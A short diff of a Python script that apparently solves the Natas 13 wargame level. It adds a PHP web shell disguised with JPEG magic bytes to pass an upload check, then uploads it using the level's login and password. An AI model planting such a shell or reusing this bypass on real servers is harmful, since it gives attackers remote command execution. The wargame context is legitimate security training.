@@ -1,6 +1,10 @@
 import requests
 import re
 
+""" exif_shell.php
+ÿØÿà<? passthru($_GET["c"]); ?>
+"""
+
 # first upload specially crafted exif_shell.php to the server
 auth = requests.auth.HTTPBasicAuth('natas13','jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY')
 files = {'uploadedfile': open('exif_shell.php','rb')} 
